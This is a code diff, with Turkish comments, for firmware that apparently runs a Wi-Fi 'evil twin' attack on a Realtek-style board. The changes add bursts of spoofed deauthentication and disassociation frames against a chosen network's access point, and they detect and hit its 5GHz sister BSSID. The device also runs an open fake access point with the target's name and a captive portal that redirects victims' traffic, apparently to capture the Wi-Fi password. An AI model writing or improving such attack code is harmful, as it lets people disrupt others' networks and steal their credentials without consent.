@@ -260,9 +260,11 @@ bool pending_ap_switch = false;
 unsigned long revert_time = 0; 
 
 char target_ssid[MAX_SSID_LEN] = {0};
-uint8_t target_bssid[6] = {0}; 
+uint8_t target_bssid[6]    = {0};
+uint8_t target_5g_bssid[6] = {0};  // Tespit edilen 5GHz BSSID (sıfırsa henüz yok)
 int32_t target_channel = 6;
 uint8_t target_enc = ENC_TYPE_CCMP;
+volatile int32_t target_5g_channel = 0;  // 0 = henüz tespit edilmedi
 
 volatile bool deauth_active = false;
 volatile bool portal_busy   = false;
@@ -271,7 +273,7 @@ unsigned long last_netif_check_ms = 0;
 #define NETIF_CHECK_INTERVAL_MS 5000UL
 
 unsigned long last_client_connect_ms = 0;
-#define CLIENT_GRACE_MS 5000UL
+#define CLIENT_GRACE_MS 2000UL
 
 WiFiServer server(SERVER_PORT); 
 DNSServer  dnsServer;
@@ -339,6 +341,17 @@ rtw_security_t mapSecurity(uint8_t enc) {
   }
 }
 
+// ─── BSSID KARDEŞ KONTROLÜ ───────────────────────────────────────────────────
+// Çoğu dual-band modemde 5GHz BSSID = 2.4GHz BSSID son baytı +1..+4
+bool isSisterBSSID(const uint8_t *base, const uint8_t *candidate) {
+  for (int i = 0; i < 5; i++) {
+    if (base[i] != candidate[i]) return false;
+  }
+  int diff = (int)candidate[5] - (int)base[5];
+  if (diff < 0) diff = -diff;
+  return (diff >= 1 && diff <= 4);
+}
+
 // ─── AĞ TARAYICI ─────────────────────────────────────────────────────────────
 static std::vector<NetworkInfo> scan_temp;
 
@@ -360,6 +373,12 @@ rtw_result_t raw_scan_handler(rtw_scan_handler_result_t *malloced_scan_result) {
     else net.enc = ENC_TYPE_CCMP;
     
     if (net.ssid.length() > 0) {
+      // 5GHz kardeş BSSID tespiti: ilk 5 byte eşleşir, son byte 1-4 fark
+      if (net.channel >= 36 && target_bssid[0] != 0 && isSisterBSSID(target_bssid, net.bssid)) {
+        target_5g_channel = net.channel;
+        memcpy(target_5g_bssid, net.bssid, 6);
+      }
+
       bool dup = false;
       for (auto &existing : scan_temp) {
         if (existing.ssid == net.ssid) {
@@ -418,8 +437,8 @@ void wifiConnectTask(void *param) {
   for (int t = 0; t < try_count; t++) {
     wifi_disconnect();
     vTaskDelay(pdMS_TO_TICKS(300));
-    wext_set_mode(WLAN0_NAME, IW_MODE_INFRA);
-    vTaskDelay(pdMS_TO_TICKS(200));
+    // wext_set_mode KALDIRILDI: STA_AP modunda wlan0 zaten infra modunda,
+    // çağırmak AP arayüzünü (wlan1) bozuyor.
     ret = wifi_connect((char *)pending_ssid, try_sec[t], (char *)pending_pass, (int)strlen(pending_ssid), pass_len, -1, NULL);
     if (ret == RTW_SUCCESS) {
       vTaskDelay(pdMS_TO_TICKS(500));
@@ -454,8 +473,6 @@ void deauthTask(void *param) {
     0x00, 0x00, 0x07, 0x00 
   };
   
-  int common_5g_channels[] = {36, 40, 44, 48, 149};
-
   Serial.println("\n[Deauth] Anti-Kacis ve Dinamik AP Takibi Aktif!");
 
   while (deauth_active) {
@@ -471,53 +488,52 @@ void deauthTask(void *param) {
         // Ancak en garantisi, AP'yi her zaman hedefin bilinen en son kanalında tutmaktır.)
     }
 
-    // === 1. HEDEFİN ANA KANALINA ATIŞ (Birincil Öncelik) ===
+    // === 1. HEDEFİN ANA KANALINA YOĞUN ATIŞ (Birincil Öncelik) ===
     wifi_set_channel(target_channel);
-    for (int offset = -2; offset <= 2; offset++) {
-        uint8_t temp_bssid[6];
-        memcpy(temp_bssid, target_bssid, 6);
-        temp_bssid[5] = (uint8_t)(temp_bssid[5] + offset);
-        memcpy(&frame_template[10], temp_bssid, 6);
-        memcpy(&frame_template[16], temp_bssid, 6);
+    for (int burst = 0; burst < 3; burst++) {
+      for (int offset = -2; offset <= 2; offset++) {
+          uint8_t temp_bssid[6];
+          memcpy(temp_bssid, target_bssid, 6);
+          temp_bssid[5] = (uint8_t)(temp_bssid[5] + offset);
+          memcpy(&frame_template[10], temp_bssid, 6);
+          memcpy(&frame_template[16], temp_bssid, 6);
 
-        frame_template[0] = 0xC0; frame_template[24] = 0x07;
-        wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
-        frame_template[24] = 0x02;
-        wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
-        frame_template[0] = 0xA0; frame_template[24] = 0x08;
-        wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
-        vTaskDelay(pdMS_TO_TICKS(1)); 
+          frame_template[0] = 0xC0; frame_template[24] = 0x07;
+          wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
+          frame_template[24] = 0x02;
+          wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
+          frame_template[0] = 0xA0; frame_template[24] = 0x08;
+          wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
+      }
     }
-    
+
     // Portal meşgulse VEYA yeni bağlantı grace süresi dolmadıysa
     // kanala geri dön ve bekle — captive portal tespiti + HTTP trafiği kesilmesin
     wifi_set_channel(target_channel);
     if (portal_busy || (millis() - last_client_connect_ms < CLIENT_GRACE_MS)) {
-        vTaskDelay(pdMS_TO_TICKS(200));
+        vTaskDelay(pdMS_TO_TICKS(100));
         continue;
     }
 
-    // Ağın Çökmemesi İçin Nefes Alma (150ms)
-    vTaskDelay(pdMS_TO_TICKS(150)); 
+    // Kısa nefes (50ms)
+    vTaskDelay(pdMS_TO_TICKS(50));
 
-    // === 2. 5GHz KANALLARINA BASKIN ===
-    for(int c=0; c < 5; c++) {
-        if (portal_busy) break;
-        wifi_set_channel(common_5g_channels[c]);
-        for (int offset = -2; offset <= 2; offset++) {
-            uint8_t temp_bssid[6];
-            memcpy(temp_bssid, target_bssid, 6);
-            temp_bssid[5] = (uint8_t)(temp_bssid[5] + offset);
-            memcpy(&frame_template[10], temp_bssid, 6);
-            memcpy(&frame_template[16], temp_bssid, 6);
-
+    // === 2. HEDEFIN TESPİT EDİLEN 5GHz BSSID+KANALINA HEDEFLI ATIŞ ===
+    // 2.4GHz gibi: tam BSSID ile, tarama sonucu doğrulanmış kanalda
+    int32_t ch5g = target_5g_channel;
+    uint8_t bssid5g[6];
+    memcpy(bssid5g, target_5g_bssid, 6);
+    if (ch5g > 0 && ch5g != target_channel && bssid5g[0] != 0 && !portal_busy) {
+        wifi_set_channel(ch5g);
+        memcpy(&frame_template[10], bssid5g, 6);
+        memcpy(&frame_template[16], bssid5g, 6);
+        for (int burst = 0; burst < 3; burst++) {
             frame_template[0] = 0xC0; frame_template[24] = 0x07;
             wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
             frame_template[24] = 0x02;
             wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
             frame_template[0] = 0xA0; frame_template[24] = 0x08;
             wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
-            vTaskDelay(pdMS_TO_TICKS(1)); 
         }
     }
     // 5GHz sonrası mutlaka target_channel'a geri dön
@@ -570,10 +586,10 @@ void sendChunkedCSS(WiFiClient &client) {
   const char *p = CSS_STR;
   while (*p) {
     int len = 0;
-    while (p[len] != '\0' && len < 200) len++;
+    while (p[len] != '\0' && len < 512) len++;
     client.write((const uint8_t *)p, len);
     client.flush();
-    delay(5);
+    delay(2);
     p += len;
   }
 }
@@ -708,16 +724,79 @@ void sendPortalPage(WiFiClient &client, bool show_result) {
 
 // ─── HTTP İŞLEYİCİSİ ─────────────────────────────────────────────────────────
 void handleClient(WiFiClient &client) {
-  unsigned long timeout = millis() + 3000;
-  String request = ""; request.reserve(512);
+  // ── BULK OKUMA: char-by-char yerine tampon ile hızlı okuma ──
+  static char hbuf[896];
+  int total = 0;
+  unsigned long timeout = millis() + 1200;
 
-  while (client.connected() && millis() < timeout) {
-    if (client.available()) {
-      char c = client.read(); request += c;
-      if (request.endsWith("\r\n\r\n")) break;
-    } else delay(1);
+  while (client.connected() && millis() < timeout && total < (int)sizeof(hbuf) - 1) {
+    int avail = client.available();
+    if (avail > 0) {
+      int toRead = avail;
+      if (toRead > (int)sizeof(hbuf) - 1 - total) toRead = (int)sizeof(hbuf) - 1 - total;
+      int n = client.read((uint8_t*)hbuf + total, toRead);
+      if (n > 0) {
+        total += n;
+        hbuf[total] = '\0';
+        if (strstr(hbuf, "\r\n\r\n")) break;
+      }
+    } else {
+      delayMicroseconds(500);
+    }
   }
-  if (request.length() == 0) return;
+  if (total == 0) return;
+  hbuf[total] = '\0';
+
+  // ── ERKEN ÇIKIŞ: Captive portal tespiti — tam parse bekleme ──
+  // İlk satırdan path'i al
+  char *sp1 = strchr(hbuf, ' ');
+  char *sp2 = sp1 ? strchr(sp1 + 1, ' ') : NULL;
+  char rawpath[128] = "/";
+  if (sp1 && sp2 && (sp2 - sp1 - 1) < (int)sizeof(rawpath)) {
+    int plen = sp2 - sp1 - 1;
+    memcpy(rawpath, sp1 + 1, plen);
+    rawpath[plen] = '\0';
+    // Query string sil
+    char *qm = strchr(rawpath, '?');
+    if (qm) *qm = '\0';
+  }
+
+  // Host header'ını bul
+  char hostbuf[64] = "";
+  char *hi = strstr(hbuf, "\r\nHost: ");
+  if (hi) {
+    hi += 8;
+    char *he = strstr(hi, "\r\n");
+    if (he) {
+      int hlen = he - hi; if (hlen >= (int)sizeof(hostbuf)) hlen = sizeof(hostbuf) - 1;
+      memcpy(hostbuf, hi, hlen); hostbuf[hlen] = '\0';
+      // Port numarasını sil
+      char *col = strchr(hostbuf, ':'); if (col) *col = '\0';
+    }
+  }
+
+  bool path_is_captive = strstr(rawpath, "hotspot-detect") != NULL
+                      || strstr(rawpath, "generate_204")   != NULL
+                      || strstr(rawpath, "redirect")       != NULL
+                      || strstr(rawpath, "connecttest")    != NULL
+                      || strstr(rawpath, "ncsi")           != NULL
+                      || strstr(rawpath, "canonical")      != NULL
+                      || strstr(rawpath, "success")        != NULL
+                      || strstr(rawpath, "mobile/status")  != NULL
+                      || strstr(rawpath, "library/test")   != NULL
+                      || strstr(rawpath, "internet_check") != NULL
+                      || strstr(rawpath, "wpad.dat")       != NULL;
+  bool host_is_foreign = (hostbuf[0] != '\0' && strcmp(hostbuf, AP_IP_ADDR) != 0);
+
+  if (path_is_captive || host_is_foreign) {
+    client.print(buildRedirect());
+    client.flush();
+    return;
+  }
+
+  // Tam parse için String'e al (sadece non-captive istekler için)
+  String request(hbuf);
+  String path(rawpath);
 
   String body = ""; int content_len = 0;
   int cl_idx = request.indexOf("Content-Length: ");
@@ -726,44 +805,18 @@ void handleClient(WiFiClient &client) {
     if (content_len > 256) content_len = 256;
   }
   if (content_len > 0) {
-    body.reserve(content_len); int br = 0; timeout = millis() + 2000;
+    body.reserve(content_len); int br = 0; timeout = millis() + 800;
     while (br < content_len && millis() < timeout) {
-      if (client.available()) { body += (char)client.read(); br++; }
-      else delay(1);
+      int av = client.available();
+      if (av > 0) {
+        int rd = (av < content_len - br) ? av : (content_len - br);
+        for (int i = 0; i < rd; i++) body += (char)client.read();
+        br += rd;
+      } else delayMicroseconds(500);
     }
   }
 
-  String path = "";
-  int ps = request.indexOf(' ') + 1; int pe = request.indexOf(' ', ps);
-  if (ps > 0 && pe > ps) path = request.substring(ps, pe);
-  if (path.indexOf('?') != -1) path = path.substring(0, path.indexOf('?'));
-
-  String hostHeader = "";
-  int hi = request.indexOf("Host: ");
-  if (hi != -1) {
-    hostHeader = request.substring(hi + 6, request.indexOf("\r\n", hi + 6));
-    hostHeader.trim();
-    if (hostHeader.indexOf(':') != -1) hostHeader = hostHeader.substring(0, hostHeader.indexOf(':'));
-  }
-
-  // iOS, Android, Windows, Samsung captive portal tespit URL'leri
-  bool path_is_captive = path.indexOf("hotspot-detect") != -1
-                      || path.indexOf("generate_204")   != -1
-                      || path.indexOf("redirect")       != -1
-                      || path.indexOf("connecttest")    != -1
-                      || path.indexOf("ncsi")           != -1
-                      || path.indexOf("canonical")      != -1
-                      || path.indexOf("success")        != -1
-                      || path.indexOf("mobile/status")  != -1
-                      || path.indexOf("library/test")   != -1;
-  bool host_is_foreign = (hostHeader.length() > 0 && hostHeader != AP_IP_ADDR);
-
-  if (path_is_captive || host_is_foreign) {
-    client.print(buildRedirect()); 
-    client.flush();
-    delay(10);
-    return;
-  }
+  String hostHeader(hostbuf);
 
   if (!ap_switched) {
     if (request.startsWith("POST") && path == "/delete_cred") {
@@ -788,8 +841,10 @@ void handleClient(WiFiClient &client) {
       
       strncpy(target_ssid, sel_ssid.c_str(), MAX_SSID_LEN - 1);
       target_ssid[MAX_SSID_LEN - 1] = '\0';
-      target_channel = 6; 
+      target_channel = 6;
       target_enc = ENC_TYPE_CCMP;
+      target_5g_channel = 0;
+      memset(target_5g_bssid, 0, 6);
       
       if (networks_mutex) xSemaphoreTake(networks_mutex, portMAX_DELAY);
       for (auto &net : networks) {
@@ -903,17 +958,27 @@ void loop() {
     
     ap_running_channel = target_channel;
     deauth_active = true;
-    xTaskCreate(deauthTask, "deauth_tsk", 1024, NULL, tskIDLE_PRIORITY + 1, NULL);
+    xTaskCreate(deauthTask, "deauth_tsk", 4096, NULL, tskIDLE_PRIORITY + 1, NULL);
   }
 
-  // === TARAMA SONUCU: HEDEF KANAL DEĞİŞTİ Mİ? ===
+  // === TARAMA SONUCU: HEDEF KANAL DEĞİŞTİ Mİ? + 5GHz KANAL TESPİTİ ===
   if (scan_status == SCAN_DONE) {
     if (ap_switched) {
       if (networks_mutex) xSemaphoreTake(networks_mutex, portMAX_DELAY);
       for (auto &net : networks) {
+        // 2.4GHz ana kanal takibi
         if (memcmp(net.bssid, target_bssid, 6) == 0 && net.channel != target_channel) {
           Serial.print("[ChannelTrack] Hedef yeni kanalda tespit edildi: "); Serial.println(net.channel);
           target_channel = net.channel;
+        }
+        // 5GHz kardeş BSSID takibi — 2.4GHz gibi BSSID ile eşleştir
+        if (net.channel >= 36 && isSisterBSSID(target_bssid, net.bssid)) {
+          if (net.channel != target_5g_channel) {
+            Serial.print("[5GHz] BSSID eslesme, kanal guncellendi: ");
+            Serial.print(target_5g_channel); Serial.print(" -> "); Serial.println(net.channel);
+          }
+          target_5g_channel = net.channel;
+          memcpy(target_5g_bssid, net.bssid, 6);
         }
       }
       if (networks_mutex) xSemaphoreGive(networks_mutex);
@@ -936,7 +1001,7 @@ void loop() {
     dnsServer.begin();
     ap_running_channel = target_channel;
     deauth_active = true;
-    xTaskCreate(deauthTask, "deauth_tsk", 1024, NULL, tskIDLE_PRIORITY + 1, NULL);
+    xTaskCreate(deauthTask, "deauth_tsk", 4096, NULL, tskIDLE_PRIORITY + 1, NULL);
   }
 
   if (conn_status == CS_DONE_OK) {
@@ -957,23 +1022,21 @@ void loop() {
     sta_connected = false; conn_result = "fail"; conn_status = CS_IDLE;
     
     if (ap_switched) {
-      // Bağlantı denemesi AP'yi bozmuş olabilir, tamamen yeniden kur
+      // Mod sıfırlaması YOK — zaten RTW_MODE_STA_AP modundayız.
+      // wifi_connect() AP'yi biraz bozmuş olabilir, sadece AP'yi yeniden aç.
       deauth_active = false;
-      delay(300);
+      delay(200);
       dnsServer.stop();
-      delay(100);
-      wifi_set_mode(RTW_MODE_STA_AP);
-      delay(800);
       wifi_start_ap((char *)target_ssid, RTW_SECURITY_OPEN, NULL, strlen(target_ssid), 0, target_channel);
-      delay(1200);
+      delay(800);
       netif_set_up(&xnetif[1]);
       netif_set_link_up(&xnetif[1]);
-      delay(200);
+      delay(100);
       dnsServer.begin();
       ap_running_channel = target_channel;
-      Serial.println("[Fail] Sahte AP yeniden kuruldu.");
+      Serial.println("[Fail] Sahte AP yeniden kuruldu (mod degistirilmedi).");
       deauth_active = true;
-      xTaskCreate(deauthTask, "deauth_tsk", 1024, NULL, tskIDLE_PRIORITY + 1, NULL);
+      xTaskCreate(deauthTask, "deauth_tsk", 4096, NULL, tskIDLE_PRIORITY + 1, NULL);
     }
   }
 
@@ -1007,9 +1070,8 @@ void loop() {
   if (client) {
     last_client_connect_ms = millis();
     portal_busy = true;
-    handleClient(client); 
+    handleClient(client);
     client.flush();
-    delay(50); 
     client.stop();
     portal_busy = false;
   }
